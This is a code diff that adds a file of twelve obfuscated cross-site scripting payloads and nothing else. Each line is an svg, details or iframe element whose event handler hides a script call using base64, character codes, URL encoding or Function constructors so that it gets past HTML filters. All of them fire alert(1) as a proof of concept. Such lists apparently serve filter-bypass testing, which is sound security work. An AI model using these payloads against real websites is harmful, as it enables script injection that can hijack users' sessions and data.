@@ -1,0 +1,12 @@
+<svg onload='(new Function("return window"))()[["al","ert"].join("")](1)'></svg>
+<iframe srcdoc="<img src='x' onerror=eval(atob('YWxlcnQoMSk='))>"></iframe>
+<svg onload='eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+String.fromCharCode(40)+String.fromCharCode(49)+String.fromCharCode(41))'></svg>
+<iframe srcdoc='<svg onload=eval(atob("YWxlcnQoMSk="))></svg>'></iframe>
+<details open ontoggle='window[[["\x61","\x6c","\x65","\x72","\x74"].join("")]](1)'></details>
+<svg onload='(function(){var a=String;window[a.fromCharCode(97,108,101,114,116)](1)})()'></svg>
+<details open ontoggle='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'></details>
+<svg onload='eval(decodeURIComponent("%61%6c%65%72%74%28%31%29"))'></svg>
+<details open ontoggle='(window.Function(atob("YWxlcnQoMSk=")))()'></details>
+<iframe srcdoc="<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"></iframe>
+<svg onload='(new Function("return eval"))()(decodeURIComponent("%61%6c%65%72%74%28%31%29"))'></svg>
+<iframe srcdoc="<svg onload=eval(decodeURIComponent(&quot;%61%6c%65%72%74%28%31%29&quot;))></svg>"></iframe>
